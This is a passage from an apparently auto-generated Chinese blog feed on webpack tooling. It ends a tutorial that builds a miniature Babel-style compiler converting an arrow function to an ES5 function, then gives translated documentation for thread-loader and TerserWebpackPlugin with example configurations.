&quot;type&quot;: &quot;identifier&quot;,</span><br><span class="line">                        &quot;identifierName&quot;: &quot;a&quot;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &quot;operator&quot;: &quot;+&quot;,</span><br><span class="line">                    &quot;right&quot;: &#123;</span><br><span class="line">                        &quot;type&quot;: &quot;identifier&quot;,</span><br><span class="line">                        &quot;identifierName&quot;: &quot;b&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="代码转换"><a href="#代码转换" class="headerlink" title="代码转换"></a>代码转换</h2><h3 id="如何转换代码"><a href="#如何转换代码" class="headerlink" title="如何转换代码?"></a>如何转换代码?</h3><p>在 Babel 中我们使用者最常使用的地方就是代码转换,大家常用的 Babel 插件就是定义代码转换规则而生的,而代码解析和生成这一头一尾都主要是 Babel 负责。</p>
<p>比如我们要用 babel 做一个React 转小程序的转换器，babel工作流程的粗略情况是这样的：</p>
<ol>
<li> babel 将 React 代码解析为抽象语法树</li>
<li> 开发者利用 babel 插件定义转换规则，根据原本的抽象语法树生成一个符合小程序规则的新抽象语法树</li>
<li> babel 则根据新的抽象语法树生成代码，此时的代码就是符合小程序规则的新代码</li>
</ol>
<p>例如 <a href="https://github.com/NervJS/taro/blob/master/packages/taro-transformer-wx/src/index.ts#L15">Taro</a>就是用 babel 完成的小程序语法转换.</p>
<p>到这里大家就明白了,我们转换代码的关键就是根据当前的抽象语法树,以我们定义的规则生成新的抽象语法树,转换的过程就是生成新抽象语法树的过程.</p>
<h3 id="遍历抽象语法树-实现遍历器traverser"><a href="#遍历抽象语法树-实现遍历器traverser" class="headerlink" title="遍历抽象语法树(实现遍历器traverser)"></a>遍历抽象语法树(实现遍历器traverser)</h3><p><a href="https://www.teaspect.com/detail/5523#h3_9"></a></p>
<p>抽象语法树是一个树状数据结构,我们要生成新语法树,那么一定需要访问 AST 上的节点,因此我们需要一个工具来遍历抽象语法树的节点.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const traverser &#x3D; (ast, visitor) &#x3D;&gt; &#123;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 如果节点是数组那么遍历数组</span><br><span class="line">    const traverseArray &#x3D; (array, parent) &#x3D;&gt; &#123;</span><br><span class="line">        array.forEach((child) &#x3D;&gt; &#123;</span><br><span class="line">            traverseNode(child, parent);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 遍历 ast 节点</span><br><span class="line">    const traverseNode &#x3D; (node, parent) &#x3D;&gt; &#123;</span><br><span class="line">        const method &#x3D; visitor[node.type];</span><br><span class="line"></span><br><span class="line">        if (method) &#123;</span><br><span class="line">            method(node, parent);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        switch (node.type) &#123;</span><br><span class="line">        case &#39;Program&#39;:</span><br><span class="line">            traverseArray(node.body, node);</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">        case &#39;VariableDeclaration&#39;:</span><br><span class="line">            traverseArray(node.init.params, node.init);</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">        case &#39;identifier&#39;:</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">        default:</span><br><span class="line">            throw new TypeError(node.type);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    traverseNode(ast, null);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="转换代码-实现转换器transformer"><a href="#转换代码-实现转换器transformer" class="headerlink" title="转换代码(实现转换器transformer)"></a>转换代码(实现转换器transformer)</h3><p>我们要转换的代码<code>const add = (a, b) =&gt; a + b</code>其实是个变量声明,按理来讲我们要转换为es5的代码也应该是个变量声明,比如这种:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var add &#x3D; function(a, b) &#123;  return  a + b&#125;</span><br></pre></td></tr></table></figure>

<p>当然也可以不按规则,直接生成一个函数声明,像这样:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function add(a, b) &#123;  return a + b&#125;</span><br></pre></td></tr></table></figure>

<p>这次我们把代码转换为一个es5的函数声明</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-8773c1bc2fb3b2fa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>我们之前的遍历器<code>traverser</code>接收两个参数,一个是 ast 节点对象,一个是 visitor,visitor本质是挂载不同方法的 JavaScript 对象,visitor 也叫做访问者,顾名思义它会访问 ast 上每个节点,然后根据针对不同节点用相应的方法做出不同的转换.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const transformer &#x3D; (ast) &#x3D;&gt; &#123;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 新 ast</span><br><span class="line">    const newAst &#x3D; &#123;</span><br><span class="line">        type: &#39;Program&#39;,</span><br><span class="line">        body: []</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 在老 ast 上加一个指针指向新 ast</span><br><span class="line">    ast._context &#x3D; newAst.body;</span><br><span class="line"></span><br><span class="line">    traverser(ast, &#123;</span><br><span class="line">        &#x2F;&#x2F; 对于变量声明的处理方法</span><br><span class="line">        VariableDeclaration: (node, parent) &#x3D;&gt; &#123;</span><br><span class="line">            let functionDeclaration &#x3D; &#123;</span><br><span class="line">                params: []</span><br><span class="line">            &#125;;</span><br><span class="line">            if (node.init.type &#x3D;&#x3D;&#x3D; &#39;ArrowFunctionExpression&#39;) &#123;</span><br><span class="line">                functionDeclaration.type &#x3D; &#39;FunctionDeclaration&#39;;</span><br><span class="line">                functionDeclaration.identifierName &#x3D; node.identifierName;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            if (node.init.body.type &#x3D;&#x3D;&#x3D; &#39;BinaryExpression&#39;) &#123;</span><br><span class="line">                functionDeclaration.body &#x3D; &#123;</span><br><span class="line">                    type: &#39;BlockStatement&#39;,</span><br><span class="line">                    body: [&#123;</span><br><span class="line">                        type: &#39;ReturnStatement&#39;,</span><br><span class="line">                        argument: node.init.body</span><br><span class="line">                    &#125;],</span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            parent._context.push(functionDeclaration);</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;对于字符的处理方法</span><br><span class="line">        identifier: (node, parent) &#x3D;&gt; &#123;</span><br><span class="line">            if (parent.type &#x3D;&#x3D;&#x3D; &#39;ArrowFunctionExpression&#39;) &#123;</span><br><span class="line">            &#x2F;&#x2F; 忽略我这暴力的操作....领略大意即可..</span><br><span class="line">                ast._context[0].params.push(&#123;</span><br><span class="line">                    type: &#39;identifier&#39;,</span><br><span class="line">                    identifierName: node.identifierName</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    return newAst;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="生成代码-实现生成器generator"><a href="#生成代码-实现生成器generator" class="headerlink" title="生成代码(实现生成器generator)"></a>生成代码(实现生成器generator)</h2><p>我们之前提到过,生成代码这一步实际上是根据我们转换后的抽象语法树来生成新的代码,我们会实现一个函数, 他接受一个对象( ast),通过递归生成最终的代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const generator &#x3D; (node) &#x3D;&gt; &#123;</span><br><span class="line">    switch (node.type) &#123;</span><br><span class="line">    &#x2F;&#x2F; 如果是 &#96;Program&#96; 结点，那么我们会遍历它的 &#96;body&#96; 属性中的每一个结点，并且递归地</span><br><span class="line">    &#x2F;&#x2F; 对这些结点再次调用 codeGenerator，再把结果打印进入新的一行中。</span><br><span class="line">    case &#39;Program&#39;:</span><br><span class="line">        return node.body.map(generator)</span><br><span class="line">            .join(&#39;\n&#39;);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 如果是FunctionDeclaration我们分别遍历调用其参数数组以及调用其 body 的属性</span><br><span class="line">    case &#39;FunctionDeclaration&#39;:</span><br><span class="line">        return &#39;function&#39; + &#39; &#39; + node.identifierName + &#39;(&#39; + node.params.map(generator) + &#39;)&#39; + &#39; &#39; + generator(node.body);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 对于 &#96;Identifiers&#96; 我们只是返回 &#96;node&#96; 的 identifierName</span><br><span class="line">    case &#39;identifier&#39;:</span><br><span class="line">        return node.identifierName;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 如果是BlockStatement我们遍历调用其body数组</span><br><span class="line">    case &#39;BlockStatement&#39;:</span><br><span class="line">        return &#39;&#123;&#39; + node.body.map(generator) + &#39;&#125;&#39;;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 如果是ReturnStatement我们调用其 argument 的属性</span><br><span class="line">    case &#39;ReturnStatement&#39;:</span><br><span class="line">        return &#39;return&#39; + &#39; &#39; + generator(node.argument);</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F; 如果是ReturnStatement我们调用其左右节点并拼接</span><br><span class="line">    case &#39;BinaryExpression&#39;:</span><br><span class="line">        return generator(node.left) + &#39; &#39; + node.operator + &#39; &#39; + generator(node.right);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 没有符合的则报错</span><br><span class="line">    default:</span><br><span class="line">        throw new TypeError(node.type);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>至此我们完成了一个简陋的微型 babel,我们开始试验:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const compiler &#x3D; (input) &#x3D;&gt; &#123;</span><br><span class="line">    const tokens &#x3D; tokenizer(input);</span><br><span class="line">    const ast &#x3D;  parser(tokens);</span><br><span class="line">    const newAst &#x3D; transformer(ast);</span><br><span class="line">    const output &#x3D; generator(newAst);</span><br><span class="line"></span><br><span class="line">    return output;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">const str &#x3D; &#39;const add &#x3D; (a, b) &#x3D;&gt; a + b&#39;;</span><br><span class="line"></span><br><span class="line">const result &#x3D; compiler(str);</span><br><span class="line"></span><br><span class="line">console.log(result);</span><br><span class="line">&#x2F;&#x2F; function add(a,b) &#123;return a + b&#125;</span><br></pre></td></tr></table></figure>

<p>我们成功地将一个es6的箭头函数转换为es5的function函数.</p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>我们可以通过这个微型 babel 了解 babel 的工作原理,如果让你对编译原理产生兴趣并去深入那是更好的, babel集合包 是有数十万行代码的巨大工程,我们用区区几百行代码只能展示其最基本的原理,代码有很多不合理之处</p>
<blockquote>
<p>原文：<a href="https://www.cxymsg.com/guide/ast.html">https://www.cxymsg.com/guide/ast.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>webpack</category>
      </categories>
  </entry>
  <entry>
    <title>thread-loader</title>
    <url>/nirvana/webpack/webpack/thread-loader/</url>
    <content><![CDATA[<h2 id="快速开始"><a href="#快速开始" class="headerlink" title="快速开始 "></a>快速开始 <a href="https://webpack.docschina.org/loaders/thread-loader/#getting-started"></a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install --save-dev thread-loader</span><br></pre></td></tr></table></figure>

<p>使用时，需将此 loader 放置在其他 loader 之前。放置在此 loader 之后的 loader 会在一个独立的 worker 池中运行。</p>
<p>在 worker 池中运行的 loader 是受到限制的。例如：</p>
<ul>
<li>  这些 loader 不能生成新的文件。</li>
<li>  这些 loader 不能使用自定义的 loader API（也就是说，不能通过插件来自定义）。</li>
<li>  这些 loader 无法获取 webpack 的配置。</li>
</ul>
<p>每个 worker 都是一个独立的 node.js 进程，其开销大约为 600ms 左右。同时会限制跨进程的数据交换。</p>
<p>请仅在耗时的操作中使用此 loader！</p>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例 "></a>示例 <a href="https://webpack.docschina.org/loaders/thread-loader/#examples"></a></h3><p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  module: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: &#x2F;\.js$&#x2F;,</span><br><span class="line">        include: path.resolve(&#39;src&#39;),</span><br><span class="line">        use: [</span><br><span class="line">          &quot;thread-loader&quot;,</span><br><span class="line">          &#x2F;&#x2F; 耗时的 loader （例如 babel-loader）</span><br><span class="line">        ],</span><br><span class="line">      &#125;,</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>with options</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use: [</span><br><span class="line">  &#123;</span><br><span class="line">    loader: &quot;thread-loader&quot;,</span><br><span class="line">    &#x2F;&#x2F; 有同样配置的 loader 会共享一个 worker 池</span><br><span class="line">    options: &#123;</span><br><span class="line">      &#x2F;&#x2F; 产生的 worker 的数量，默认是 (cpu 核心数 - 1)，或者，</span><br><span class="line">      &#x2F;&#x2F; 在 require(&#39;os&#39;).cpus() 是 undefined 时回退至 1</span><br><span class="line">      workers: 2,</span><br><span class="line"></span><br><span class="line">      &#x2F;&#x2F; 一个 worker 进程中并行执行工作的数量</span><br><span class="line">      &#x2F;&#x2F; 默认为 20</span><br><span class="line">      workerParallelJobs: 50,</span><br><span class="line"></span><br><span class="line">      &#x2F;&#x2F; 额外的 node.js 参数</span><br><span class="line">      workerNodeArgs: [&#39;--max-old-space-size&#x3D;1024&#39;],</span><br><span class="line"></span><br><span class="line">      &#x2F;&#x2F; 允许重新生成一个僵死的 work 池</span><br><span class="line">      &#x2F;&#x2F; 这个过程会降低整体编译速度</span><br><span class="line">      &#x2F;&#x2F; 并且开发环境应该设置为 false</span><br><span class="line">      poolRespawn: false,</span><br><span class="line"></span><br><span class="line">      &#x2F;&#x2F; 闲置时定时删除 worker 进程</span><br><span class="line">      &#x2F;&#x2F; 默认为 500（ms）</span><br><span class="line">      &#x2F;&#x2F; 可以设置为无穷大，这样在监视模式(--watch)下可以保持 worker 持续存在</span><br><span class="line">      poolTimeout: 2000,</span><br><span class="line"></span><br><span class="line">      &#x2F;&#x2F; 池分配给 worker 的工作数量</span><br><span class="line">      &#x2F;&#x2F; 默认为 200</span><br><span class="line">      &#x2F;&#x2F; 降低这个数值会降低总体的效率，但是会提升工作分布更均一</span><br><span class="line">      poolParallelJobs: 50,</span><br><span class="line"></span><br><span class="line">      &#x2F;&#x2F; 池的名称</span><br><span class="line">      &#x2F;&#x2F; 可以修改名称来创建其余选项都一样的池</span><br><span class="line">      name: &quot;my-pool&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#x2F;&#x2F; 耗时的 loader（例如 babel-loader）</span><br><span class="line">];</span><br></pre></td></tr></table></figure>

<p><strong>预警</strong></p>
<p>可以通过预警 worker 池来防止启动 worker 时的高延时。</p>
<p>这会启动池内最大数量的 worker 并把指定的模块加载到 node.js 的模块缓存中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const threadLoader &#x3D; require(&#39;thread-loader&#39;);</span><br><span class="line"></span><br><span class="line">threadLoader.warmup(</span><br><span class="line">  &#123;</span><br><span class="line">    &#x2F;&#x2F; 池选项，例如传递给 loader 选项</span><br><span class="line">    &#x2F;&#x2F; 必须匹配 loader 选项才能启动正确的池</span><br><span class="line">  &#125;,</span><br><span class="line">  [</span><br><span class="line">    &#x2F;&#x2F; 加载模块</span><br><span class="line">    &#x2F;&#x2F; 可以是任意模块，例如</span><br><span class="line">    &#39;babel-loader&#39;,</span><br><span class="line">    &#39;babel-preset-es2015&#39;,</span><br><span class="line">    &#39;sass-loader&#39;,</span><br><span class="line">  ]</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>webpack</category>
      </categories>
  </entry>
  <entry>
    <title>TerserWebpackPlugin</title>
    <url>/nirvana/webpack/webpack/TerserWebpackPlugin/</url>
    <content><![CDATA[<h2 id="入门"><a href="#入门" class="headerlink" title="入门 "></a>入门 <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#getting-started"></a></h2><p>如果你使用的是 webpack v5 或以上版本，你不需要安装这个插件。webpack v5 自带最新的 <code>terser-webpack-plugin</code>。如果使用 webpack v4，则必须安装 <code>terser-webpack-plugin</code> v4 的版本。</p>
<p>首先，你需要安装 <code>terser-webpack-plugin</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm install terser-webpack-plugin --save-dev</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后将插件添加到你的 <code>webpack</code> 配置文件中。例如：</p>
<p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const TerserPlugin &#x3D; require(&quot;terser-webpack-plugin&quot;);</span><br><span class="line"></span><br><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimize: true,</span><br><span class="line">    minimizer: [new TerserPlugin()],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>接下来，按照你习惯的方式运行 <code>webpack</code>。</p>
<h2 id="关于-source-maps-说明"><a href="#关于-source-maps-说明" class="headerlink" title="关于 source maps 说明 "></a>关于 source maps 说明 <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#note-about-source-maps"></a></h2><p><strong>Works only with <code>source-map</code>, <code>inline-source-map</code>, <code>hidden-source-map</code> and <code>nosources-source-map</code> values for the <a href="https://webpack.docschina.org/configuration/devtool/"><code>devtool</code></a> option.</strong></p>
<p>Why?</p>
<ul>
<li>  <code>eval</code> wraps modules in <code>eval(&quot;string&quot;)</code> and the minimizer does not handle strings.</li>
<li>  <code>cheap</code> has not column information and minimizer generate only a single line, which leave only a single mapping.</li>
</ul>
<p>Using supported <code>devtool</code> values enable source map generation.</p>
<h2 id="选项"><a href="#选项" class="headerlink" title="选项 "></a>选项 <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#options"></a></h2><h3 id="test"><a href="#test" class="headerlink" title="test "></a><code>test</code> <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#test"></a></h3><p>类型： <code>String|RegExp|Array&lt;String|RegExp&gt;</code> 默认值：<code>/\.m?js(\?.*)?$/i</code></p>
<p>用来匹配需要压缩的文件。</p>
<p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimize: true,</span><br><span class="line">    minimizer: [</span><br><span class="line">      new TerserPlugin(&#123;</span><br><span class="line">        test: &#x2F;\.js(\?.*)?$&#x2F;i,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="include"><a href="#include" class="headerlink" title="include "></a><code>include</code> <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#include"></a></h3><p>类型： <code>String|RegExp|Array&lt;String|RegExp&gt;</code> 默认值： <code>undefined</code></p>
<p>匹配参与压缩的文件。</p>
<p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimize: true,</span><br><span class="line">    minimizer: [</span><br><span class="line">      new TerserPlugin(&#123;</span><br><span class="line">        include: &#x2F;\&#x2F;includes&#x2F;,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="exclude"><a href="#exclude" class="headerlink" title="exclude "></a><code>exclude</code> <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#exclude"></a></h3><p>类型： <code>String|RegExp|Array&lt;String|RegExp&gt;</code> 默认值： <code>undefined</code></p>
<p>匹配不需要压缩的文件。</p>
<p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimize: true,</span><br><span class="line">    minimizer: [</span><br><span class="line">      new TerserPlugin(&#123;</span><br><span class="line">        exclude: &#x2F;\&#x2F;excludes&#x2F;,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="parallel"><a href="#parallel" class="headerlink" title="parallel "></a><code>parallel</code> <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#parallel"></a></h3><p>类型： <code>Boolean|Number</code> 默认值： <code>true</code></p>
<p>使用多进程并发运行以提高构建速度。 并发运行的默认数量： <code>os.cpus().length - 1</code> 。</p>
<blockquote>
<p>并发运行可以显著提高构建速度，因此<strong>强烈建议添加此配置</strong> 。</p>
</blockquote>
<blockquote>
<p>如果你使用 <strong>Circle CI</strong> 或任何其他不提供 CPU 实际可用数量的环境，则需要显式设置 CPU 数量，以避免 <code>Error: Call retries were exceeded</code>（请参阅 <a href="https://github.com/webpack-contrib/terser-webpack-plugin/issues/143">#143</a>，<a href="https://github.com/webpack-contrib/terser-webpack-plugin/issues/202">#202</a> ）。</p>
</blockquote>
<h4 id="Boolean"><a href="#Boolean" class="headerlink" title="Boolean "></a><code>Boolean</code> <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#boolean"></a></h4><p>启用/禁用多进程并发运行功能。</p>
<p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimize: true,</span><br><span class="line">    minimizer: [</span><br><span class="line">      new TerserPlugin(&#123;</span><br><span class="line">        parallel: true,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="Number"><a href="#Number" class="headerlink" title="Number "></a><code>Number</code> <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#number"></a></h4><p>启用多进程并发运行并设置并发运行次数。</p>
<p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimize: true,</span><br><span class="line">    minimizer: [</span><br><span class="line">      new TerserPlugin(&#123;</span><br><span class="line">        parallel: 4,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="minify"><a href="#minify" class="headerlink" title="minify "></a><code>minify</code> <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#minify"></a></h3><p>类型： <code>Function</code> 默认值： <code>undefined</code></p>
<p>允许你自定义压缩函数。 默认情况下，插件使用 <a href="https://github.com/terser-js/terser">terser</a> 库。 对于使用和测试未发布的版本或 fork 的代码很帮助。</p>
<blockquote>
<p>⚠️ <strong>启用 <code>parallel</code> 选项时，在 <code>minify</code> 函数内部只能使用 <code>require</code></strong> 。</p>
</blockquote>
<p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimize: true,</span><br><span class="line">    minimizer: [</span><br><span class="line">      new TerserPlugin(&#123;</span><br><span class="line">        terserOptions: &#123;</span><br><span class="line">          myCustomOption: true,</span><br><span class="line">        &#125;,</span><br><span class="line">        &#x2F;&#x2F; Can be async</span><br><span class="line">        minify: (file, sourceMap, minimizerOptions) &#x3D;&gt; &#123;</span><br><span class="line">          &#x2F;&#x2F; The &#96;minimizerOptions&#96; option contains option from the &#96;terserOptions&#96; option</span><br><span class="line">          &#x2F;&#x2F; You can use &#96;minimizerOptions.myCustomOption&#96;</span><br><span class="line">          const extractedComments &#x3D; [];</span><br><span class="line"></span><br><span class="line">          &#x2F;&#x2F; Custom logic for extract comments</span><br><span class="line"></span><br><span class="line">          const &#123; map, code &#125; &#x3D; require(&quot;uglify-module&quot;) &#x2F;&#x2F; Or require(&#39;.&#x2F;path&#x2F;to&#x2F;uglify-module&#39;)</span><br><span class="line">            .minify(file, &#123;</span><br><span class="line">              &#x2F;* Your options for minification *&#x2F;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">          return &#123; map, code, extractedComments &#125;;</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="terserOptions"><a href="#terserOptions" class="headerlink" title="terserOptions "></a><code>terserOptions</code> <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#terseroptions"></a></h3><p>类型： <code>Object</code> 默认值： <a href="https://github.com/terser-js/terser#minify-options">默认</a></p>
<p>Terser 压缩<a href="https://github.com/terser-js/terser#minify-options">配置</a> 。</p>
<p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimize: true,</span><br><span class="line">    minimizer: [</span><br><span class="line">      new TerserPlugin(&#123;</span><br><span class="line">        terserOptions: &#123;</span><br><span class="line">          ecma: undefined,</span><br><span class="line">          parse: &#123;&#125;,</span><br><span class="line">          compress: &#123;&#125;,</span><br><span class="line">          mangle: true, &#x2F;&#x2F; Note &#96;mangle.properties&#96; is &#96;false&#96; by default.</span><br><span class="line">          module: false,</span><br><span class="line">          &#x2F;&#x2F; Deprecated</span><br><span class="line">          output: null,</span><br><span class="line">          format: null,</span><br><span class="line">          toplevel: false,</span><br><span class="line">          nameCache: null,</span><br><span class="line">          ie8: false,</span><br><span class="line">          keep_classnames: undefined,</span><br><span class="line">          keep_fnames: false,</span><br><span class="line">          safari10: false,</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="extractComments"><a href="#extractComments" class="headerlink" title="extractComments "></a><code>extractComments</code> <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#extractcomments"></a></h3><p>类型： <code>Boolean|String|RegExp|Function&lt;(node, comment) -&gt; Boolean|Object&gt;|Object</code> 默认值： <code>true</code></p>
<p>是否将注释剥离到单独的文件中（请参阅<a href="https://github.com/webpack/webpack/commit/71933e979e51c533b432658d5e37917f9e71595a">详细信息</a>）。 默认情况下，仅剥离 <code>/^\**!|@preserve|@license|@cc_on/i</code> 正则表达式匹配的注释，其余注释会删除。 如果原始文件名为 <code>foo.js</code> ，则注释将存储到 <code>foo.js.LICENSE.txt</code> 。 <code>terserOptions.format.comments</code> 选项指定是否保留注释，即可以在剥离其他注释时保留一些注释，甚至保留已剥离的注释。</p>
<h4 id="Boolean-1"><a href="#Boolean-1" class="headerlink" title="Boolean "></a><code>Boolean</code> <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#boolean"></a></h4><p>启用/禁用剥离注释功能。</p>
<p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimize: true,</span><br><span class="line">    minimizer: [</span><br><span class="line">      new TerserPlugin(&#123;</span><br><span class="line">        extractComments: true,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="String"><a href="#String" class="headerlink" title="String "></a><code>String</code> <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#string"></a></h4><p>剥离 <code>all</code> 或 <code>some</code> （使用 <code>/^\**!|@preserve|@license|@cc_on/i</code> 正则表达式进行匹配）注释。</p>
<p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimize: true,</span><br><span class="line">    minimizer: [</span><br><span class="line">      new TerserPlugin(&#123;</span><br><span class="line">        extractComments: &quot;all&quot;,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="RegExp"><a href="#RegExp" class="headerlink" title="RegExp "></a><code>RegExp</code> <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#regexp"></a></h4><p>与指定表达式匹配的所有注释将会被剥离到单独的文件中。</p>
<p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimize: true,</span><br><span class="line">    minimizer: [</span><br><span class="line">      new TerserPlugin(&#123;</span><br><span class="line">        extractComments: &#x2F;@extract&#x2F;i,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

